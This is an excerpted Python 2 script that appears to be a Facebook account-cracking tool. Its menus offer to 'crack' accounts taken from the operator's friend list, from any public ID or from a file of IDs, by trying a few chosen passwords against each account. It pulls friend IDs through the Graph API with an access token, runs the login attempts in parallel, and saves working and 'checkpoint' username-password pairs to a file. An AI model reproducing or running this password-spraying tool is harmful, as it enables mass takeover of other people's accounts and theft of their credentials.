...
def menu2():
    ...
    os.system('clear')
    print banner
    print '\x1b[1;97mName: ' + name
    print ' \x1b[1;97mID  : ' + id
    print '-' + 46 * '-'
    print '[1]\x1b[1;97m Clone With 5 Choice Passwords.'
    print '[2]\x1b[1;97m Clone With 2 Choice Passwords.'
...
def menu2_menu():
    ...
    if m2m == '':
        ...
        os.system('clear')
        hamza('\x1b[1;97mPlease Wait.')
        hamza('\x1b[1;97mWhile Is Returning To Main Menu.')
        time.sleep(1)
...
def choice1():
    ...
    os.system('clear')
    print banner
    print '[1] \x1b[1;97mCrack From Friend List.'
    print '[2] \x1b[1;97mCrack From Any Public ID.'
    print '[3]\x1b[1;97m Crack From File.'
    print '[0] Back'
    print '        '
    choice1_menu()
...
def choice1_menu():
    ...
    if c1m == '':
        ...
        os.system('clear')
        print banner
        pass1 = raw_input('[1] \x1b[1;97mInput Password  1 : ')
        pass2 = raw_input('[2] \x1b[1;97mInput Password 2 : ')
        pass3 = raw_input('[3] \x1b[1;97mInput Password 3 : ')
        pass4 = raw_input('[4] \x1b[1;97mInput Password 4 : ')
        pass5 = raw_input('[5]\x1b[1;97m Input Password 5 : ')
        print 47 * '-'
        ...
        os.system('clear')
        print banner
        idt = raw_input('\x1b[1;97m ID : ')
        pass1 = raw_input('[1] \x1b[1;97mInput Password 1 : ')
        pass2 = raw_input('[2] \x1b[1;97mInput Password 2 : ')
        pass3 = raw_input('[3] \x1b[1;97mInput Password 3 : ')
        pass4 = raw_input('[4] \x1b[1;97mInput Password 4 : ')
        pass5 = raw_input('[5] \x1b[1;97mInput Password 5 : ')
        print 47 * '-'
        print banner
        try:
            jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
            op = json.loads(jok.text)
            hamza('\x1b[1;97mAccount  Name: ' + op['name'])
            time.sleep(0.5)
        except KeyError:
        ...
        print banner
        try:
            idlist = raw_input('\x1b[1;97m Enter File Path  : ')
            pass1 = raw_input('[1] \x1b[1;97mInput Password 1 : ')
            pass2 = raw_input('[2] \x1b[1;97mInput Password 2 : ')
            pass3 = raw_input('[3] \x1b[1;97mInput Password 3 : ')
            pass4 = raw_input('[4] \x1b[1;97mInput Password 4 : ')
        ...
        choice1_menu()
    rana = str(len(id))
    hamza('\x1b[1;97mTotal Friends: ' + rana)
    time.sleep(0.5)
    hamza('\x1b[1;97mThe Process Has Been Started.')
    time.sleep(0.5)
    hamza('\x1b[1;97mPress CTRL Z To Stop Process')
    time.sleep(0.5)
    print 47 * '-'
    ...
    p.map(main, id)
    print '\x1b[1;97m----------------------------------------------'
    hamza('\x1b[1;97m Process Has Been Completed.')
    hamza('\x1b[1;97mCheckpoint Ids Has Been Saved.')
    xx = str(len(oks))
    xxx = str(len(checkpoint))
    print '\x1b[1;97mTotal \x1b[1;97mOK/\x1b[1;97mCP : \x1b[1;97m' + str(len(oks)) + '/\x1b[1;97m' + str(len(checkpoint))
    print 47 * '-'
    raw_input('\nPress Enter To Back ')
    choice1()
...
def choice2():
    ...
    print banner
    print '[1] \x1b[1;97mCrack From Friend List.'
    print '[2]\x1b[1;97m Crack From Any Public ID.'
    print '[3]\x1b[1;97m Crack From File.'
    print '[0] Back'
    print '        '
    choice2_menu()
...
def choice2_menu():
    ...
    if c2m == '':
        ...
        print banner
        pass1 = raw_input('[1] \x1b[1;97mInput Password 1 : ')
        pass2 = raw_input('[2]\x1b[1;97m Input Password 2 : ')
        r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
        z = json.loads(r.text)
        for s in z['data']:
            id.append(s['id'])
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                ...
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[1;97m[\x1b[1;97mSuccessful\x1b[1;97m]\x1b[1;97m ' + user + ' \x1b[1;97m|\x1b[1;30m ' + pass2
                    oks.append(user + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;97m[\x1b[1;94mCheckpoint-LoginAfter7Day\x1b[1;97m]\x1b[1;97m ' + user + ' \x1b[1;97m|\x1b[1;97m ' + pass2
                    crt = open('save/checkpoint.txt', 'a')
                    crt.write(user + '|' + pass2 + '\n')
                    crt.close()
                    checkpoint.append(user + pass2)
    ...
    p.map(main, id)
    print '\x1b[1;97m----------------------------------------------'
    hamza('\x1b[1;97mProcess Has Been Completed.')
    hamza('\x1b[1;97mCheckpoint IDS Has Been Saved.')
    xx = str(len(oks))
    xxx = str(len(checkpoint))
